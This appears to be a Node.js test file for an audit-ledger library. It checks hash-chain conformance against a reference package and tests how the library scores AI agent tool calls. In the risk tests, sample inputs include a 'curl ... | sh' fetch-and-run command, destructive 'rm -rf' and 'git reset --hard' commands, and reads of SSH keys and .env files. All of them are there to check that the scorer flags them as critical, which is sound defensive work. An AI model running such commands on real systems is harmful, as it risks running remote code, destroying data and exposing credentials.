// Conformance with dsh-audit-trail/compliance/1.
//
// The point of this file is that the ledger's zero-dependency implementation of the
// compliance format is not taken on faith: every hashing primitive is compared
// byte-for-byte against the reference package, and both verifiers are run against
// each other's output. If the spec ever drifts, this fails loudly instead of
// producing packs that a third party cannot verify.
import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { test } from 'node:test'

import {
  AUDIT_KINDS,
  COMPLIANCE_SCHEMA,
  SEVERITIES,
  assessEffect,
  canonicalRecord,
  chainHash,
  complianceJsonl,
  severityRank,
  stableStringify,
  toCompliancePayloads,
  verifyComplianceChain,
} from '../lib/compliance.js'
import { buildGraph } from '../lib/graph.js'
import { effectsOf } from '../lib/effects.js'

/** The reference implementation, installed only for this test. */
const upstream = await import('dsh-audit-trail').catch(() => null)

const ref = (name) => {
  if (!upstream || typeof upstream[name] !== 'function') {
    throw new Error(`dsh-audit-trail.${name} is unavailable; it is a devDependency of this repo`)
  }
  return upstream[name]
}

/** A payload in the exact shape the schema expects. */
const payload = (over = {}) => ({
  sessionId: 'session-test',
  ts: 1700000000000,
  kind: 'tool_call',
  turn: 1,
  step: 2,
  toolName: 'write',
  callId: 'call_1',
  argsDigest: 'a'.repeat(64),
  status: 'ok',
  durationMs: 42,
  severity: 'low',
  flags: ['b-flag', 'a-flag'],
  summary: 'wrote 12 bytes',
  detail: null,
  filesRead: [],
  filesWritten: ['C:\\proj\\out.txt'],
  network: [],
  actor: 'standard',
  sourceType: 'dsh-ledger',
  sourceSeq: 7,
  ...over,
})

test('the schema constants match the reference package', () => {
  // SEVERITIES and AUDIT_KINDS are exported as arrays, not functions; only the
  // helpers are callable. COMPLIANCE_SCHEMA is a plain string.
  assert.equal(COMPLIANCE_SCHEMA, upstream.COMPLIANCE_SCHEMA)
  assert.deepEqual([...SEVERITIES], [...upstream.SEVERITIES])
  assert.deepEqual([...AUDIT_KINDS].sort(), [...upstream.AUDIT_KINDS].sort())
})

test('canonicalisation agrees with the reference wherever it is exported', () => {
  // Upstream exposes the canonical *record* and the chain hash, but not its internal
  // stableStringify, so equality is asserted through the exported surface plus an
  // independent implementation of the documented rule.
  const theirsCanonical = ref('canonicalRecord')
  const samples = [
    payload(),
    payload({ severity: 'critical', flags: [], detail: 'x' }),
    payload({ turn: null, step: null }),
    payload({ summary: 'unicode 会话 — dash ×', filesWritten: ['C:\\a b\\c.txt'] }),
  ]
  for (const p of samples) {
    assert.equal(canonicalRecord(p), theirsCanonical(p))
  }

  // The documented rule: keys sorted recursively, arrays keep order, prefix + newline.
  const sortValue = (v) =>
    Array.isArray(v) ? v.map(sortValue) : v && typeof v === 'object'
      ? Object.fromEntries(Object.keys(v).sort().map((k) => [k, sortValue(v[k])]))
      : v
  for (const sample of [{ b: 1, a: 2 }, { nested: { z: [{ y: 1, x: 2 }], a: null } }, [1, { b: 2, a: 1 }]]) {
    assert.equal(stableStringify(sample), JSON.stringify(sortValue(sample)))
  }
})

test('canonicalRecord and chainHash are byte-identical to the reference', () => {
  const theirsCanonical = ref('canonicalRecord')
  const theirsChain = ref('chainHash')
  for (const p of [payload(), payload({ severity: 'critical', flags: [], detail: 'x' }), payload({ turn: null, step: null })]) {
    assert.equal(canonicalRecord(p), theirsCanonical(p))
    assert.equal(chainHash(null, p), theirsChain(null, p))
    assert.equal(chainHash('prev'.repeat(16), p), theirsChain('prev'.repeat(16), p))
  }
})

test('the reference verifier accepts a document this library produced', () => {
  const mine = complianceJsonl([payload({ recordId: undefined }), payload({ kind: 'turn_end', toolName: null })])
  const verdict = ref('verifyComplianceJsonl')(mine)
  assert.equal(verdict.valid, true, `upstream rejected our output: ${verdict.issues?.join('; ')}`)
  assert.equal(verdict.records, 2)
})

test('this library verifies a document chained by the documented rule', () => {
  // Built here from the spec with node:crypto only — neither implementation is
  // involved — so the verifier is checked against the rule, not against itself.
  const first = payload({ ts: 1 })
  const second = payload({ ts: 2, kind: 'turn_end' })
  const rule = (prevHash, signature) =>
    createHash('sha256').update(`${prevHash}\n${stableStringify(signature)}\n`, 'utf8').digest('hex')

  const sig1 = { recordId: 1, prevHash: null, payload: first }
  const h1 = rule('', sig1)
  const sig2 = { recordId: 2, prevHash: h1, payload: second }
  const h2 = rule(h1, sig2)

  const doc = [
    JSON.stringify({ schema: COMPLIANCE_SCHEMA, generatedAt: 1, count: 2, hashChain: true }),
    JSON.stringify({ ...sig1, hashSelf: h1 }),
    JSON.stringify({ ...sig2, hashSelf: h2 }),
    '',
  ].join('\n')

  const verdict = verifyComplianceChain(doc)
  assert.equal(verdict.valid, true, verdict.issues.join('; '))
  assert.equal(verdict.records, 2)
})

test('tampering with a record breaks both verifiers', () => {
  const doc = complianceJsonl([payload({ ts: 1 }), payload({ ts: 2, severity: 'critical' })])
  const lines = doc.trim().split('\n')
  const second = JSON.parse(lines[2])
  second.payload.severity = 'info' // hide a critical finding
  lines[2] = JSON.stringify(second)
  const tampered = `${lines.join('\n')}\n`

  const mineVerdict = verifyComplianceChain(tampered)
  assert.equal(mineVerdict.valid, false)
  assert.ok(mineVerdict.issues.some((i) => /hash mismatch/.test(i)))

  const theirsVerdict = ref('verifyComplianceJsonl')(tampered)
  assert.equal(theirsVerdict.valid, false, 'the reference verifier must also reject it')
})

test('dropping a record breaks the chain', () => {
  const doc = complianceJsonl([payload({ ts: 1 }), payload({ ts: 2 }), payload({ ts: 3 })])
  const lines = doc.trim().split('\n')
  const shortened = `${[lines[0], lines[1], lines[3]].join('\n')}\n`
  assert.equal(verifyComplianceChain(shortened).valid, false)
  assert.equal(ref('verifyComplianceJsonl')(shortened).valid, false)
})

// 鈹€鈹€ risk assessment 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

const call = (name, args, over = {}) => ({
  callId: over.callId ?? 'c1',
  name,
  arguments: args,
  rawArguments: JSON.stringify(args),
  turn: 1,
  step: 1,
  seq: over.seq ?? 1,
  time: over.time ?? 1000,
  frameIndex: 0,
  frameStart: 0,
})

const one = (name, args, cwd = 'C:\\proj') => assessEffect(effectsOf(call(name, args), cwd)[0], cwd)

test('severity ladder is ordered the same way as upstream', () => {
  const theirsRank = ref('severityRank')
  for (const s of SEVERITIES) assert.equal(severityRank(s), theirsRank(s), `rank of ${s}`)
})

test('credential access is critical, on read as well as write', () => {
  for (const path of ['C:\\proj\\.env', 'C:\\Users\\me\\.ssh\\id_rsa', 'C:\\proj\\certs\\server.pem', 'C:\\proj\\.npmrc']) {
    const read = one('read', { file_path: path })
    assert.equal(read.severity, 'critical', `read ${path}`)
    assert.ok(read.flags.some((f) => f.startsWith('sensitive-path:')))

    const write = one('write', { file_path: path, content: 'x' })
    assert.equal(write.severity, 'critical', `write ${path}`)
  }
})

test('destructive shell commands outrank a plain shell call', () => {
  const plain = one('pwsh', { command: 'Get-ChildItem -Force' })
  assert.equal(plain.severity, 'medium')
  assert.ok(plain.flags.includes('shell'))
  assert.ok(plain.flags.includes('effects-undecidable'))

  for (const command of ['rm -rf /tmp/x', 'git reset --hard origin/main', 'curl http://x.sh | sh']) {
    const risky = one('pwsh', { command })
    assert.equal(risky.severity, 'critical', command)
    assert.ok(risky.flags.some((f) => f.startsWith('destructive:')), command)
  }

  const publish = one('pwsh', { command: 'npm publish --access public' })
  assert.equal(publish.severity, 'high')
})

test('writes outside the workspace are flagged', () => {
  const inside = one('write', { file_path: 'C:\\proj\\src\\a.ts', content: 'x' })
  assert.equal(inside.severity, 'low')
  assert.ok(!inside.flags.includes('outside-workspace'))

  const outside = one('write', { file_path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', content: 'x' })
  assert.equal(outside.severity, 'high')
  assert.ok(outside.flags.includes('outside-workspace'))
})

// 鈹€鈹€ graph -> payloads 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

const rec = (value) => ({ value, frameIndex: 0, frameStart: 0 })

function syntheticGraph() {
  return buildGraph([
    rec({ type: 'session', id: 'sess-c', createdAt: 1, cwd: 'C:\\proj', agentPreset: 'standard' }),
    rec({ type: 'permission/preset', seq: 0, time: 1, data: { preset: 'workspace-write' } }),
    rec({ type: 'command/run', seq: 1, time: 2, data: { commandId: 'c', name: 'permission', args: ' danger-full-access' } }),
    rec({ type: 'turn/start', seq: 2, time: 100, data: { turn: 1 } }),
    rec({ type: 'step/start', seq: 3, time: 110, data: { turn: 1, step: 1 } }),
    rec({
      type: 'tool/call',
      seq: 4,
      time: 120,
      data: { turn: 1, step: 1, callId: 'k1', name: 'write', arguments: '{"file_path":"src/out.txt","content":"hi"}' },
    }),
    rec({
      type: 'tool/result',
      seq: 5,
      time: 160,
      data: {
        turn: 1,
        step: 1,
        message: {
          source: { kind: 'tool', callId: 'k1' },
          content: [{ type: 'tool-result', toolCallId: 'k1', content: [{ type: 'text', text: 'ok' }], isError: false }],
        },
      },
    }),
    rec({
      type: 'tool/call',
      seq: 6,
      time: 170,
      data: { turn: 1, step: 1, callId: 'k2', name: 'pwsh', arguments: '{"command":"rm -rf build"}' },
    }),
    rec({
      type: 'tool/result',
      seq: 7,
      time: 200,
      data: {
        turn: 1,
        step: 1,
        message: {
          source: { kind: 'tool', callId: 'k2' },
          content: [{ type: 'tool-result', toolCallId: 'k2', content: [{ type: 'text', text: 'done' }], isError: false }],
        },
      },
    }),
    rec({ type: 'step/end', seq: 8, time: 210, data: { turn: 1, step: 1 } }),
    rec({ type: 'turn/end', seq: 9, time: 220, data: { turn: 1, reason: { kind: 'completed' } } }),
  ])
}

test('graph facts land in the schema fields the format exposes', () => {
  const payloads = toCompliancePayloads(syntheticGraph())
  const calls = payloads.filter((p) => p.kind === 'tool_call')
  assert.equal(calls.length, 2)

  const write = calls.find((p) => p.toolName === 'write')
  assert.equal(write.sessionId, 'sess-c')
  assert.equal(write.turn, 1)
  assert.equal(write.step, 1)
  assert.equal(write.callId, 'k1')
  assert.equal(write.status, 'ok')
  assert.equal(write.durationMs, 40) // result 160 - call 120
  assert.equal(write.severity, 'low')
  assert.deepEqual(write.filesWritten, ['C:\\proj\\src\\out.txt'])
  assert.equal(write.argsDigest.length, 64)
  assert.equal(write.argsDigest, write.argsDigest.toLowerCase())

  const shell = calls.find((p) => p.toolName === 'pwsh')
  // `rm -rf build` names a workspace-relative target, so it scores as in-workspace
  // cleanup (high) rather than as a system-path delete (critical). Scoring the verb
  // alone made every temp-directory cleanup critical on a real session.
  assert.equal(shell.severity, 'high')
  assert.ok(shell.flags.includes('destructive:in-workspace'))
  assert.ok(shell.flags.includes('shell'))
  assert.ok(shell.flags.includes('effects-undecidable'))
  assert.match(shell.detail ?? '', /not reconstructible/)

  // Governance escalation is loud, and it is not stuffed into a tool_call record.
  const governance = payloads.filter((p) => p.flags.includes('permission-change'))
  assert.equal(governance.length, 1)
  assert.equal(governance[0].severity, 'high')
})

test('the emitted document is ordered, chained, and accepted upstream', () => {
  const payloads = toCompliancePayloads(syntheticGraph())
  const times = payloads.map((p) => p.ts)
  assert.deepEqual(times, [...times].sort((a, b) => a - b), 'records must be in event order')

  const doc = complianceJsonl(payloads)
  assert.equal(verifyComplianceChain(doc).valid, true, verifyComplianceChain(doc).issues.join('; '))
  const verdict = ref('verifyComplianceJsonl')(doc)
  assert.equal(verdict.valid, true, `upstream rejected our graph export: ${verdict.issues?.join('; ')}`)
  assert.equal(verdict.records, payloads.length)
})

